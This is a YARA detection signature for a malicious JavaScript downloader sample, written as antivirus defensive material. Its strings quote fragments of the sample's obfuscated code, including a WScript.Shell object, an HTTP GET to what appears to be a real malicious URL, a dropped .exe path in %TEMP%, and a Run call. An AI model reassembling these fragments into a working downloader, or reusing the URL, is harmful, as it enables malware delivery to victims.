rule sig_20160330_6dab0de7877e7e6c505f85fb3c2f951b {
  meta:
    description = "datamaliciousorder - file 20160330_6dab0de7877e7e6c505f85fb3c2f951b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "954b8d53d9150ed83828daec40ac5edbf4649cdf09f4b45eeac8d75a380494ba"

  strings:
    $s1  = "var _H0 = function _A() {return WScript[_Q](\"WScript\"+\".Shell\");}(), _S0 = 11;" fullword ascii
    $s2  = "_RO[_S](\"GET\", \"http://bonares.pl/x9isa\", false);" fullword ascii
    $s3  = "function _UJ(_NB, _M0){_EJ = _EJ * 1; return _NB - _M0;};" fullword ascii
    $s4  = "if (_RO[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _TE(){return _YE + \"\";};" fullword ascii
    $s6  = "function _R() {return _H0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"L2Fp6Qi64qIm.ex\" + \"e\";};" fullword ascii
    $s7  = "function _A0(_EO){_H0[\"Run\"](_EO, _EJ, _EJ);};" fullword ascii
    $s8  = "function _JM() {return ((_PV == true) && (_PV == _G)) ? 1 : _EJ;};" fullword ascii
    $s9  = " while (_J){" fullword ascii
    $s10 = "function _W()" fullword ascii
    $s11 = "function _HA(_N) {var _SL = (1, 2, 3, 4, 5, _N); return _SL;};" fullword ascii
    $s12 = "var _K = new this[\"Date\"]();" fullword ascii
    $s13 = "function _D(){return _Q;};" fullword ascii
    $s14 = "function _RZ(){return 22;};" fullword ascii
    $s15 = "return _UJ(_BD, _HO);" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "_G = true; " fullword ascii
    $s18 = "var _G0 = false;" fullword ascii
    $s19 = "_PV = true; " fullword ascii
    $s20 = "var _PV = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}